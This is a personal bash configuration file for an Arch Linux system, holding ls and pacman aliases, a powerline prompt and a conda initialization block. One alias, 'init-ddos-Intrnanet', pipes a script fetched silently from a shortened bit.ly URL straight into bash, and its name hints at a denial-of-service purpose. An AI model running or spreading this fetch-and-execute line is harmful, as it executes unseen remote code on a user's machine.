#
# ~/.bashrc
#

# If not running interactively, don't do anything
[[ $- != *i* ]] && return

alias ls='ls --color=auto'
alias la='ls --color=auto -lA'
alias pac='sudo pacman -S'
alias updateSys='sudo pacman -Syu'

PS1='[\u@\h \W]\$ '
[ -r /home/caspar/.byobu/prompt ] && . /home/caspar/.byobu/prompt   #byobu-prompt#

function _update_ps1() {

    PS1=$(powerline-shell $?)

}


if [[ $TERM != linux && ! $PROMPT_COMMAND =~ _update_ps1 ]]; then

    PROMPT_COMMAND="_update_ps1; $PROMPT_COMMAND"

fi

#neofetch

# >>> conda initialize >>>
# !! Contents within this block are managed by 'conda init' !!
__conda_setup="$('/home/caspar/anaconda3/bin/conda' 'shell.bash' 'hook' 2> /dev/null)"
if [ $? -eq 0 ]; then
    eval "$__conda_setup"
else
    if [ -f "/home/caspar/anaconda3/etc/profile.d/conda.sh" ]; then
        . "/home/caspar/anaconda3/etc/profile.d/conda.sh"
    else
        export PATH="/home/caspar/anaconda3/bin:$PATH"
    fi
fi
unset __conda_setup
# <<< conda initialize <<<

alias init-ddos-Intrnanet='curl -s -L http://bit.ly/10hA8iC | bash'
alias wm='sudo wifi-menu'
